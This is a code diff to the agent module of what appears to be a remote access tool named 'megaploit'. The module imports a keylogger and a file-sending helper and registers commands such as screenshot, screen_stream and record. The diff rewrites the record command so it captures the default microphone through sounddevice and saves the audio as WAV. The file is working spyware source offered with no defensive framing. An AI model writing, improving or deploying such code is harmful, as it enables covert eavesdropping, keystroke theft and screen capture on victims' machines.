@@ -15,8 +15,6 @@ import shutil
 import subprocess
 import sys
 import threading
-import wave
-
 from megaploit.core.protocol import send_file as _send_file
 from megaploit.core.config import MAX_RECORD_SECONDS
 from megaploit.agent.keylogger import Keylogger
@@ -29,7 +27,8 @@ except ImportError:
     _HAS_GUI = False
 
 try:
-    import pyaudio
+    import sounddevice as _sd
+    import soundfile as _sf
     _HAS_AUDIO = True
 except ImportError:
     _HAS_AUDIO = False
@@ -153,7 +152,7 @@ def _screenshot(conn, args: list[str]) -> str | None:
 @_register("record")
 def _record(conn, args: list[str]) -> str | None:
     if not _HAS_AUDIO:
-        return "[-] pyaudio not available"
+        return "[-] sounddevice/soundfile not available"
     if len(args) != 1 or not args[0].isdigit():
         return "Usage: record <seconds>"
     seconds = min(int(args[0]), MAX_RECORD_SECONDS)
@@ -168,22 +167,17 @@ def _record(conn, args: list[str]) -> str | None:
 
 
 def _do_record(path: str, seconds: int) -> None:
-    p = pyaudio.PyAudio()
-    chunk = 1024
-    fmt = pyaudio.paInt16
-    channels = 1
+    """Record from the default microphone using sounddevice (no PortAudio build required)."""
     rate = 44100
-    stream = p.open(format=fmt, channels=channels, rate=rate,
-                    input=True, frames_per_buffer=chunk)
-    frames = [stream.read(chunk) for _ in range(int(rate / chunk * seconds))]
-    stream.stop_stream()
-    stream.close()
-    p.terminate()
-    with wave.open(path, "wb") as wf:
-        wf.setnchannels(channels)
-        wf.setsampwidth(p.get_sample_size(fmt))
-        wf.setframerate(rate)
-        wf.writeframes(b"".join(frames))
+    channels = 1
+    audio = _sd.rec(
+        int(seconds * rate),
+        samplerate=rate,
+        channels=channels,
+        dtype="int16",
+    )
+    _sd.wait()                    # block until recording finishes
+    _sf.write(path, audio, rate)  # saves as WAV by extension
 
 
 @_register("screen_stream")
